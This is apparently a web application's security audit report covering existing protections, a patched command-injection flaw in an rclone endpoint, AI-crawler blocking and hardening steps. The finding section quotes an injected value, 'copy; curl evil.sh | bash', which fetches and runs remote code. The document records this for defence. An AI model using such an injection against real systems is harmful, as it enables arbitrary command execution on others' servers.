# Security Audit — 2026-08-23

## Verified protections (already in place)

| Area | Status |
|---|---|
| Global API auth gate (`src/proxy.js`, Next 16 proxy/middleware) | ✅ All `/api/*` require a valid NextAuth JWT except an explicit allowlist |
| Allowlisted public routes self-verify | ✅ `deploy/webhook` (HMAC-SHA256 signature), `deploy/telegram` (401 checks), `firewall/agent-sync` (`x-agent-token`), `settings/database` + `deploy/trigger` (own `getServerSession` checks) |
| Security headers | ✅ `X-Content-Type-Options`, `X-Frame-Options: DENY`, `Referrer-Policy`; `poweredByHeader: false` |
| Webhook signature comparison | ✅ HMAC-SHA256, timing-safe |
| Secrets at rest | ✅ Zero-knowledge vault encryption for connection credentials (`src/utils/encryption.js`) |
| Dependency vulnerabilities (prod) | ✅ `npm audit --omit=dev` → 0 vulnerabilities |

## Vulnerabilities found & patched in this audit

### 1. Command injection via `action` parameter (HIGH) — FIXED
`POST /api/rclone/exec` interpolated the user-supplied `action` field **unquoted**
into a remote shell command (`"$RCLONE_BIN" ${action} ...`). An authenticated
attacker could send `action: "copy; curl evil.sh | bash"` to execute arbitrary
commands on any stored server connection.

**Fix:** strict allowlist (`sync | copy | move | check`) enforced before any
command construction (`src/app/api/rclone/exec/route.js`). `source`/`target`
were already properly single-quote escaped via the `quote()` helper.

## AI crawler / scraper protection (added 2026-08-23)

Three layers prevent high-tier AI models (GPT, Claude, Gemini-extended,
Perplexity, ByteDance, Meta, etc.) from harvesting site content:

1. **`public/robots.txt`** — explicit `Disallow: /` for 19 known AI bots
   (GPTBot, OAI-SearchBot, ChatGPT-User, ClaudeBot, Claude-Web, anthropic-ai,
   Google-Extended, CCBot, Bytespider, PerplexityBot/User, Amazonbot,
   Applebot-Extended, cohere-ai, Meta-ExternalAgent/Fetcher, Diffbot,
   ImagesiftBot, YouBot).
2. **Hard edge block in `src/proxy.js`** — requests whose User-Agent matches
   any of those bots get an immediate **403 Forbidden**, before auth or page
   rendering. This enforces the policy even for bots that ignore robots.txt.
3. **`X-Robots-Tag: noai, noimageai` header** on every response
   (`next.config.mjs`) — tells compliant AI systems not to use content for
   training or AI-generated images.

Note: user-agent blocking stops well-behaved crawlers; a determined attacker
can spoof a browser UA. The app's real data is behind authentication anyway,
so scraping exposure is limited to public pages.

## Notes on "AI hacking" (prompt-injection / LLM abuse)

The AI-analyze endpoint (`/api/deploy/ai-analyze`) sends deploy logs to an LLM.
Prompt injection via malicious log content can at worst influence the *text
summary* returned — the AI output is not executed as code or commands, so this
is low risk. Keep it that way: never feed LLM output into `exec`, eval, or
deployment commands.

## Hardening applied (2026-08-23, round 2)

| Control | Implementation |
|---|---|
| Login rate limiting & lockout | `src/lib/loginRateLimit.js` — 5 failed attempts per email / 30 per IP within 15 min -> 15 min lockout; wired into the credentials `authorize` callback (`src/lib/auth.js`) |
| Hardcoded fallback secret removed | `NEXTAUTH_SECRET` no longer falls back to a committed literal — a predictable secret would allow session-JWT forgery |
| Content-Security-Policy | `default-src 'self'`, script/style allowlists, `frame-ancestors 'none'`, `object-src 'none'`, `base-uri`, `form-action` (next.config.mjs) |
| Permissions-Policy | camera/microphone/geolocation disabled |
| Audit logging | `src/lib/auditLog.js` -> MongoDB `audit_logs` collection, TTL 90 days, fire-and-forget; wired into `rclone.exec`, `deploy.trigger`, `firewall.apply` |

## Remaining recommendations

1. **Move relay tokens & rate limits to persistent storage** (Redis or Mongo TTL collections) if you scale beyond one instance.
2. **HTTPS in production** - ensures `__Secure-` cookies apply.
3. **Rotate `NEXTAUTH_SECRET`** periodically; never commit `.env`.
4. **Tighten CSP over time** - currently allows `unsafe-inline`/`unsafe-eval` for scripts (required by Next.js without nonce plumbing); consider nonce-based CSP later.
5. **UI hardening** - fix remaining react-hooks warnings and add E2E tests for critical flows.
